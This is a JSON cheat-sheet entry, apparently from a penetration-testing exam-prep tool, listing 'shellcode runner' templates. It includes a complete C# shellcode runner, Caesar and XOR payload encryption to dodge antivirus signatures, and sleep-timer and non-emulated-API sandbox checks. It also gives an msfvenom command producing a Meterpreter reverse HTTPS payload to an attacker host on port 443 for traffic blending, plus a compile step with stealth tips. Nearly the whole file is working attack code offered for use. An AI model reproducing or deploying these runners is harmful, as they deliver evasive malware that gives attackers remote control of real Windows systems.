{
  "category": "Shellcode Runners",
  "description": "Custom shellcode execution templates for C#, VBA, and PowerShell. Includes encryption methods to evade signature detection.",
  "commands": [
    {
      "id": "csharp-shellcode-runner-basic",
      "name": "C# Shellcode Runner (Basic)",
      "description": "Basic C# template for executing raw shellcode via VirtualAlloc → CreateThread → WaitForSingleObject pattern. Foundation for all custom runners.",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "csharp",
        "shellcode",
        "windows",
        "payload-delivery"
      ],
      "command": "using System;\nusing System.Runtime.InteropServices;\n\nnamespace ShellcodeRunner {\n    class Program {\n        [DllImport(\"kernel32\")]\n        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n        \n        [DllImport(\"kernel32\")]\n        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n        \n        [DllImport(\"kernel32\")]\n        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n        \n        static void Main(string[] args) {\n            byte[] buf = new byte[] { <SHELLCODE> };\n            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);\n            Marshal.Copy(buf, 0, addr, buf.Length);\n            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n            WaitForSingleObject(hThread, 0xFFFFFFFF);\n        }\n    }\n}",
      "variables": [
        {
          "name": "<SHELLCODE>",
          "description": "Raw shellcode bytes in C# format (0xfc,0x48,0x83,...)",
          "example": "0xfc,0x48,0x83,0xe4,0xf0",
          "required": true
        }
      ],
      "notes": "Syntax:\nSave as Program.cs, compile with csc.exe Basic runner will be flagged by modern AV.\n\nAlways add encryption (caesar/xor) or heuristic evasion before deploying.\n\nPractice compiling on Windows target.\n\nTime estimate:\n2 minutes (with pre-generated shellcode) References:\ndocs/av-evasion/shellcode-runners.md#basic-runner, PEN-300 Chapter 6.5.1 Manual alternative:\nUse Python ctypes, PowerShell reflection, or compiled languages (C/C++) for shellcode execution",
      "success_indicators": [
        "No console output. Shellcode executes (e.g., reverse shell connects, Meterpreter session opens)."
      ],
      "failure_indicators": [
        "Defender flags VirtualAlloc(PAGE_EXECUTE_READWRITE) - Add encryption or sandbox checks",
        "Compilation error - Ensure .NET 4.0+ framework installed",
        "Shellcode doesn't execute - Verify architecture match (x86 vs x64)",
        "Access denied - May need admin rights depending on payload"
      ]
    },
    {
      "id": "csharp-caesar-encrypt",
      "name": "C# Caesar Cipher Encryption",
      "description": "Encrypt shellcode with Caesar cipher (byte rotation). Simple obfuscation to evade static signatures. Decrypt at runtime before execution.",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "csharp",
        "encryption",
        "shellcode",
        "obfuscation"
      ],
      "command": "// ENCRYPTION (offline)\nbyte[] buf = new byte[] { <RAW_SHELLCODE> };\nbyte[] encoded = new byte[buf.Length];\nfor(int i = 0; i < buf.Length; i++) {\n    encoded[i] = (byte)(((uint)buf[i] + <KEY>) & 0xFF);\n}\n// Print encoded array\nConsole.WriteLine(\"byte[] encoded = new byte[] { \" + string.Join(\",\", encoded.Select(b => $\"0x{b:X2}\")) + \" };\");\n\n// DECRYPTION (runtime in runner)\nfor(int i = 0; i < buf.Length; i++) {\n    buf[i] = (byte)(((uint)buf[i] - <KEY>) & 0xFF);\n}",
      "variables": [
        {
          "name": "<RAW_SHELLCODE>",
          "description": "Original shellcode bytes from msfvenom",
          "example": "0xfc,0x48,0x83",
          "required": true
        },
        {
          "name": "<KEY>",
          "description": "Caesar cipher rotation key (1-255)",
          "example": "2",
          "required": true
        }
      ],
      "notes": "Syntax:\nAdd encryption offline, add decryption to runner before VirtualAlloc Caesar cipher is weak but fast.\n\nGood for lab practice.\n\nFor exam, use XOR or combine with heuristic evasion.\n\nKey=2 is common in examples.\n\nTime estimate:\n5 minutes (encryption + integration) References:\ndocs/av-evasion/shellcode-runners.md#caesar-cipher, PEN-300 Chapter 6.5.2 Manual alternative:\nUse XOR encryption (stronger), AES encryption (strongest), or custom encoding schemes",
      "success_indicators": [
        "Encrypted runner bypasses static signatures. Shellcode executes normally after runtime decryption."
      ],
      "failure_indicators": [
        "Wrong key - Shellcode corrupted, won't execute",
        "Encryption detected by heuristics - Add sleep timers or API checks",
        "Still flagged - Caesar too simple, use XOR or AES instead"
      ]
    },
    {
      "id": "csharp-xor-encrypt",
      "name": "C# XOR Encryption",
      "description": "XOR encryption for shellcode. Stronger than Caesar cipher. Each byte XORed with key, decrypt by XORing again (XOR is reversible).",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "csharp",
        "encryption",
        "shellcode",
        "xor"
      ],
      "command": "// ENCRYPTION (offline)\nbyte[] buf = new byte[] { <RAW_SHELLCODE> };\nbyte[] encoded = new byte[buf.Length];\nfor(int i = 0; i < buf.Length; i++) {\n    encoded[i] = (byte)((uint)buf[i] ^ <XOR_KEY>);\n}\n\n// DECRYPTION (runtime - same operation)\nfor(int i = 0; i < buf.Length; i++) {\n    buf[i] = (byte)((uint)buf[i] ^ <XOR_KEY>);\n}",
      "variables": [
        {
          "name": "<RAW_SHELLCODE>",
          "description": "Original shellcode bytes",
          "example": "0xfc,0x48,0x83",
          "required": true
        },
        {
          "name": "<XOR_KEY>",
          "description": "XOR encryption key (0-255)",
          "example": "0xAA",
          "required": true
        }
      ],
      "notes": "Syntax:\nXOR encrypt offline, XOR decrypt at runtime (same key) XOR is standard industry practice.\n\nKey 0xAA common but predictable - use random key.\n\nCombine with heuristic evasion for best results.\n\nTime estimate:\n5 minutes References:\ndocs/av-evasion/shellcode-runners.md#xor-encryption Manual alternative:\nUse multi-byte XOR keys, AES encryption, or RC4 cipher for stronger protection",
      "success_indicators": [
        "XOR encrypted payload bypasses more signatures than Caesar. Decrypts and executes at runtime."
      ],
      "failure_indicators": [
        "Key mismatch - Shellcode corrupted",
        "XOR pattern detected - Use multi-byte key or AES",
        "Still flagged by heuristics - Add sleep timers"
      ]
    },
    {
      "id": "csharp-sleep-timer",
      "name": "C# Sleep Timer Evasion",
      "description": "Heuristic evasion using sleep timer with elapsed time validation. Sandboxes skip Sleep() calls - detect by measuring actual elapsed time.",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "csharp",
        "heuristic",
        "sandbox-detection",
        "sleep"
      ],
      "command": "using System;\nusing System.Threading;\n\nDateTime t1 = DateTime.Now;\nThread.Sleep(<SLEEP_MS>);\ndouble deltaT = DateTime.Now.Subtract(t1).TotalSeconds;\nif(deltaT < <THRESHOLD_SEC>) {\n    return; // Sandbox detected - exit\n}\n// Continue with payload execution",
      "variables": [
        {
          "name": "<SLEEP_MS>",
          "description": "Sleep duration in milliseconds",
          "example": "10000",
          "required": true
        },
        {
          "name": "<THRESHOLD_SEC>",
          "description": "Minimum expected elapsed time (slightly less than sleep duration to account for processing)",
          "example": "9.5",
          "required": true
        }
      ],
      "notes": "Syntax:\nAdd before shellcode execution in Main() Simple but effective against basic sandboxes.\n\n10 seconds is standard.\n\nFor exam, may skip to save time if target already compromised.\n\nGood for phishing scenarios.\n\nTime estimate:\n1 minute (add to existing runner) References:\ndocs/av-evasion/shellcode-runners.md#sleep-timer, PEN-300 Chapter 6.6.1 Manual alternative:\nUse non-emulated API checks (VirtualAllocExNuma), large memory allocations, or anti-debugging techniques",
      "success_indicators": [
        "In sandbox: Exits immediately (sandbox detected). On real system: Waits 10 seconds then executes payload."
      ],
      "failure_indicators": [
        "Advanced sandboxes may wait out sleep - Use longer delays or combine techniques",
        "User impatience - 10 seconds may alert user, consider shorter sleep",
        "False positive on slow systems - Adjust threshold downward"
      ]
    },
    {
      "id": "csharp-non-emulated-api",
      "name": "C# Non-Emulated API Check",
      "description": "Detect sandbox by calling VirtualAllocExNuma - rarely emulated API. If NULL returned, sandbox detected. Combines with GetCurrentProcess for legitimacy.",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "csharp",
        "heuristic",
        "sandbox-detection",
        "api-check"
      ],
      "command": "using System;\nusing System.Runtime.InteropServices;\n\n[DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\nstatic extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);\n\n[DllImport(\"kernel32.dll\")]\nstatic extern IntPtr GetCurrentProcess();\n\n// Sandbox check\nIntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);\nif(mem == null) {\n    return; // Sandbox detected - API not emulated\n}\n// Continue with payload",
      "variables": [],
      "notes": "Syntax:\nAdd before shellcode execution in Main() More sophisticated than sleep timer.\n\nBypasses sandboxes that wait out delays.\n\nCombine both for maximum evasion.\n\nQuick to add (<10 lines).\n\nTime estimate:\n2 minutes References:\ndocs/av-evasion/shellcode-runners.md#non-emulated-api, PEN-300 Chapter 6.6.2 Manual alternative:\nUse FlsAlloc, GetTickCount64, or other rarely-emulated APIs.\n\nCheck for debugger with IsDebuggerPresent.",
      "success_indicators": [
        "In sandbox: Exits (NULL returned). On real system: Continues to payload execution."
      ],
      "failure_indicators": [
        "Advanced sandboxes may emulate VirtualAllocExNuma - Use multiple checks",
        "System doesn't support NUMA - Rare but possible, may fail on real systems",
        "Check comparison wrong - Use IntPtr.Zero not null"
      ]
    },
    {
      "id": "msfvenom-csharp-payload",
      "name": "Generate msfvenom C# Shellcode",
      "description": "Generate shellcode in C# byte array format for use in custom runners. Use HTTPS payloads for encrypted C2 communication.",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "msfvenom",
        "shellcode",
        "payload-generation",
        "csharp"
      ],
      "command": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> -f csharp",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address (must be reachable from target)",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listener port (443 recommended for HTTPS traffic blending)",
          "example": "443",
          "required": true
        }
      ],
      "prerequisites": [],
      "notes": "Syntax:\nRun on Kali, copy output to C# runner Always use HTTPS payloads (not HTTP) for better evasion.\n\nPort 443 blends with legitimate traffic.\n\nGenerate before exam, don't waste time during.\n\nTime estimate:\n30 seconds References:\ndocs/av-evasion/shellcode-runners.md#msfvenom-generation, PEN-300 Chapter 6.4 Manual alternative:\nUse custom reverse shell (bash, python, netcat) or C2 frameworks (Cobalt Strike, Sliver, Havoc)",
      "success_indicators": [
        "Shellcode byte array in C# format:\nbyte[] buf = new byte[xxx] { 0xfc,0x48,0x83,... };"
      ],
      "failure_indicators": [
        "Architecture mismatch - Ensure x64 payload for 64-bit target",
        "Port 443 blocked - Use alternate port and update listener",
        "LHOST not reachable - Verify network connectivity"
      ]
    },
    {
      "id": "compile-csharp-runner",
      "name": "Compile C# Shellcode Runner",
      "description": "Compile C# source code to Windows executable using csc.exe (.NET Framework compiler). Must be run on Windows target or staging system.",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "csharp",
        "compilation",
        "windows"
      ],
      "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:<OUTPUT_EXE> <SOURCE_CS>",
      "variables": [
        {
          "name": "<OUTPUT_EXE>",
          "description": "Output executable name",
          "example": "runner.exe",
          "required": true
        },
        {
          "name": "<SOURCE_CS>",
          "description": "C# source file path",
          "example": "Program.cs",
          "required": true
        }
      ],
      "notes": "Syntax:\nRun on Windows system with .NET Framework Practice compiling on Windows VM before exam.\n\nFramework64 for modern systems.\n\n/target:winexe hides console window (stealthier).\n\nCompilation is fast (<5 seconds).\n\nTime estimate:\n30 seconds References:\ndocs/av-evasion/shellcode-runners.md#compilation Manual alternative:\nUse Visual Studio, MSBuild, or cross-compile with Mono on Linux",
      "success_indicators": [
        "runner.exe created in current directory. No output = success."
      ],
      "failure_indicators": [
        "csc.exe not found - .NET Framework not installed or wrong path",
        "Syntax errors - Check C# code for typos",
        "Permission denied - Write access required in output directory",
        "Wrong architecture - Use Framework64 for x64, Framework for x86"
      ]
    }
  ],
  "oscp_relevance": "Essential for custom payload delivery when msfvenom raw payloads are detected. Encryption and heuristic evasion required for modern AV bypass.",
  "attack_chain_position": "Initial Access, Post-Exploitation",
  "related_categories": [
    "payload-generation",
    "evasion",
    "windows"
  ]
}